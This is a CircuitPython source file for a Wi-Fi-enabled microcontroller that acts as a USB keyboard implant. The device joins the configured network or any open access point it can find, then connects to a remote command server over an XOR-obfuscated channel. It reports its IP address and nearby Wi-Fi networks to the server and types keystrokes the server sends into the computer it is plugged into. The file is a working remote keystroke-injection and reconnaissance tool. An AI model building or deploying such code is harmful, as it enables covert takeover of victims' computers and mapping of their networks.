from socketpool import SocketPool
import wifi
from time import sleep
from os import getenv
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode  import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from usb_hid import devices

HOST=getenv("host")
PORT=getenv("port")
AP_NAME=getenv("ap_name")
AP_PASSWORD=getenv("ap_password")
KEY=getenv("key").encode("utf-8")
kbd = Keyboard(devices)
layout = KeyboardLayoutUS(kbd)
keycodes={"cmd":227, "ctrl":224, "shift":225, "alt":226, "altgr":230,"enter":40, "del":42, "supr":76, "tab":43, "larrow":80, "rarrow":79, "uarrow":82, "darrow":81}

def parseAps():
    parsedAps=[]
    for ap in wifi.radio.start_scanning_networks():
        parsedAps.append({"name":ap.ssid, "bssid": ap.bssid, "sec": ap.authmode[0], "rssi": ap.rssi})
    wifi.radio.stop_scanning_networks()
    return parsedAps

def xor_message(msg):
    xkey = (KEY * ((len(msg) // len(KEY)) + 1))[:len(msg)]
    return bytes(d ^ k for d, k in zip(msg, xkey))

def run_client(data, pool):
    data=b'\x0f\x00\x00\x00'+data.encode("utf-8")
    client = pool.socket(pool.AF_INET, pool.SOCK_STREAM)
    client.settimeout(300)
    try:
        client.connect((HOST,PORT))
        print("Client connected to server")
        client.send(xor_message(data))
        response=bytearray(256)
        while True:
            client.recv_into(response)
            decrypted=xor_message(response).split(b'\xff\xff')[0]
            print(f"{response} -> {decrypted}")
            signature=decrypted[:4]
            if signature == b'\x0f\x00\x00\x00': # Client close
                client.close()
                break
            elif signature == b'\x01\x00\x00\x00': # AP List send
                apList=parseAps()

                print(f"Sending {len(apList)} APs")
                for i in range(0, len(apList), 5):
                    items = [
                        f"{ap['name']}:{ap['bssid'].hex()}:{str(ap['sec']).split('.')[2]}:{ap['rssi']}"
                        for ap in apList[i:i+5]
                    ]

                    payload = ";".join(items)
                    chunk = xor_message(b"\x00\x00\x00\x00" + payload.encode("utf-8") + b"\xff\xff")

                    if len(chunk) < 256:
                        chunk += b"\x00" * (256 - len(chunk))
                    client.send(chunk)
            elif signature == b'\x02\x00\x00\x00': # Send Keystrokes
                message = decrypted[4:].strip(b'\x00').split(b'\xff\xff')[0]
                message = message.decode('utf-8')
                print("Writing " + message + " to host.")
                parseKeys(message)
            else: # Server close
                client.close()
                print("Connection to server closed by remote host")
            print(f"Received: {decrypted}")
            print(f"Signature: {signature}")         
    except Exception as e:
        print(f"Error: {e}")
        return getenv("sleep_onerror")
    except:
        print("Exception: " + sys.exc_info())
    finally:
        client.close()
        print("Connection to server closed")
        return getenv("sleep_onreset")

def parseKeys(keystrokes):
    pressed_keys = set()
    i = 0
    while i < len(keystrokes):
        if keystrokes[i] == "{" and "}" in keystrokes[i:]:  
            end = keystrokes.index("}", i)
            cmd = keystrokes[i+1:end]  
            i = end  
            if cmd.startswith("+"):  # Presionar tecla
                key = keycodes.get(cmd[1:].lower())
                if key:
                    kbd.press(key)
                    pressed_keys.add(key)
            elif cmd.startswith("-"):  # Soltar tecla
                key = keycodes.get(cmd[1:].lower())
                if key and key in pressed_keys:
                    kbd.release(key)
                    pressed_keys.remove(key)
            elif cmd.lower().startswith("sleep"):
                if len(cmd) == 5:
                    sleep(.05)
                else:
                    sleep(int(cmd[5:])/100)
            else:
                key = keycodes.get(cmd.lower())
                kbd.send(key)
        else:
            kbd.send(layout.keycodes(keystrokes[i])[0])
        i += 1

    kbd.release_all()

#Main
wifi.radio.hostname = getenv("id")
while True:
    attempt=0
    while not wifi.radio.connected:
        aps=parseAps()
        print(f"Available APs")
        for ap in aps:
            print(f" - {ap["name"]}")
        try:
            if attempt < 5:
                print(f"Connecting to wifi {AP_NAME}")
                wifi.radio.connect(AP_NAME,AP_PASSWORD)
            else:
                open_aps=[ap for ap in aps if ap["sec"] == wifi.AuthMode.OPEN] # Lista con los APs sin security (OPEN)
                if open_aps:
                    ap=open_aps[(attempt - 5) % len(open_aps)] # Se coge uno distinto al intento anterior
                    print("- AP", ap["name"], "OPEN")
                    wifi.radio.connect(ap["name"])
        except:
            pass

        if wifi.radio.connected:
            print("Connected")
            break
                
        attempt += 1
        if attempt == 8:
            attempt=0
        sleep(15)

    pool=SocketPool(wifi.radio)
    ap=wifi.radio.ap_info
    stime=run_client(f'{getenv("id")};{wifi.radio.ipv4_address};{ap.ssid};{ap.bssid.hex()}', pool)
    sleep(stime)
